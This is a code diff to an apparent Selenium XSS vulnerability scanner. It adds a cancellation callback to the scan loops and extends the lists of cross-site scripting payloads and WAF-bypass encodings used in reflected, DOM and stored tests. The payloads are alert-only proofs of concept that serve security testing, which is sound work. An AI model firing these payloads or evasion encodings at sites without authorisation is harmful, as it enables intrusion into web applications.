@@ -14,7 +14,7 @@ from __future__ import annotations
 
 import os
 import time
-from typing import Any
+from typing import Any, Callable
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
 from selenium import webdriver
@@ -47,6 +47,15 @@ PAYLOADS = [
     '<details/open/ontoggle=alert(1)>',
     '<img src=x onerror=confirm(1)>',
     '"><img src=x onerror=prompt(1)>',
+    '<video><source onerror="javascript:alert(1)">',
+    '" autofocus onfocus=alert(1) x="',
+    "'><svg/onload=confirm(1)>",
+    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
+    '<a href="javascript:alert(1)">click</a>',
+    '<input onfocus=alert(1) autofocus>',
+    '<marquee onstart=alert(1)>x</marquee>',
+    '<svg><animate onbegin=alert(1) attributeName=x dur=1s></animate></svg>',
+    '<form><button formaction="javascript:alert(1)">x</button></form>',
 ]
 
 WAF_BYPASS_PAYLOADS = [
@@ -55,6 +64,13 @@ WAF_BYPASS_PAYLOADS = [
     '%3Cscript%3Ealert(1)%3C/script%3E',
     '<svg/onload=alert`1`>',
     '"><svg/onload=confirm`1`>',
+    '%253Cscript%253Ealert(1)%253C/script%253E',
+    '&#x3c;svg onload=alert(1)&#x3e;',
+    '%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E',
+    '%3Ciframe%20srcdoc%3D%22%3Cscript%3Ealert(1)%3C/script%3E%22%3E%3C/iframe%3E',
+    '<img src=x onerror=window["al"+"ert"](1)>',
+    '<svg><set attributeName=onload to=alert(1)></set></svg>',
+    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
 ]
 
 # JS hook injected into every page BEFORE our payload runs.
@@ -142,10 +158,13 @@ def _test_reflected_selenium(
     param: str,
     use_waf_bypass: bool = False,
     evidence_dir: str | None = None,
+    should_stop: Callable[[], bool] | None = None,
 ) -> dict[str, Any] | None:
     """Inject payloads into a GET parameter and check if alert fires."""
     payloads = WAF_BYPASS_PAYLOADS if use_waf_bypass else PAYLOADS
     for payload in payloads:
+        if should_stop and should_stop():
+            return None
         target = _inject_param_url(url, param, payload)
         try:
             driver.get(target)
@@ -198,6 +217,7 @@ def _test_stored_selenium(
     form: dict[str, Any],
     retrieve_url: str,
     evidence_dir: str | None = None,
+    should_stop: Callable[[], bool] | None = None,
 ) -> dict[str, Any] | None:
     """Submit XSS via a form, then reload the page to check persistence."""
     canary = "SELENIUM_XSS_CANARY_7b2e"
@@ -209,6 +229,9 @@ def _test_stored_selenium(
             target_param = inp["name"]
             break
     if not target_param:
+        return None
+
+    if should_stop and should_stop():
         return None
 
     try:
@@ -270,14 +293,19 @@ def _test_dom_based_selenium(
     driver: webdriver.Chrome,
     url: str,
     evidence_dir: str | None = None,
+    should_stop: Callable[[], bool] | None = None,
 ) -> list[dict[str, Any]]:
     """Test for DOM-based XSS by injecting payloads into the URL fragment/hash."""
     findings: list[dict[str, Any]] = []
+    if should_stop and should_stop():
+        return findings
     hash_payloads = [
         '#<script>alert("DOM")</script>',
         '#"><img src=x onerror=alert(1)>',
     ]
     for hash_payload in hash_payloads:
+        if should_stop and should_stop():
+            break
         target = url.split("#")[0] + hash_payload
         try:
             driver.get(target)
@@ -315,6 +343,7 @@ def test_xss_selenium(
     headless: bool = True,
     quick: bool = False,
     evidence_dir: str | None = None,
+    should_stop: Callable[[], bool] | None = None,
 ) -> list[dict[str, Any]]:
     """Run XSS tests using a real browser.
 
@@ -340,9 +369,15 @@ def test_xss_selenium(
 
         # ── Reflected XSS on GET params ─────────────────────
         for url in capped_endpoints:
+            if should_stop and should_stop():
+                log.info("Selenium XSS cancelled during reflected tests")
+                break
             params = parse_qs(urlparse(url).query)
             path = urlparse(url).path
             for param in params:
+                if should_stop and should_stop():
+                    log.info("Selenium XSS cancelled on %s", path)
+                    break
                 sig = (path, param)
                 if sig in seen:
                     continue
@@ -350,6 +385,7 @@ def test_xss_selenium(
                     driver, url, param,
                     use_waf_bypass=waf_detected,
                     evidence_dir=evidence_dir,
+                    should_stop=should_stop,
                 )
                 if result:
                     findings.append(_to_finding(result))
@@ -360,6 +396,9 @@ def test_xss_selenium(
         dom_limit = 10 if quick else 15
         dom_tested = 0
         for url in capped_endpoints:
+            if should_stop and should_stop():
+                log.info("Selenium XSS cancelled during DOM tests")
+                break
             if dom_tested >= dom_limit:
                 break
             base = urlparse(url)._replace(query="", fragment="").geturl()
@@ -367,16 +406,19 @@ def test_xss_selenium(
                 continue
             visited.add(base)
             dom_tested += 1
-            for dom_finding in _test_dom_based_selenium(driver, url, evidence_dir=evidence_dir):
+            for dom_finding in _test_dom_based_selenium(driver, url, evidence_dir=evidence_dir, should_stop=should_stop):
                 findings.append(_to_finding(dom_finding))
 
         # ── Stored XSS via forms ────────────────────────────────
         stored_limit = 10 if quick else 12
         for form in forms[:stored_limit]:
+            if should_stop and should_stop():
+                log.info("Selenium XSS cancelled during stored-form tests")
+                break
             if form["method"] != "POST":
                 continue
             result = _test_stored_selenium(
-                driver, form, form["action"], evidence_dir=evidence_dir
+                driver, form, form["action"], evidence_dir=evidence_dir, should_stop=should_stop
             )
             if result:
                 findings.append(_to_finding(result))
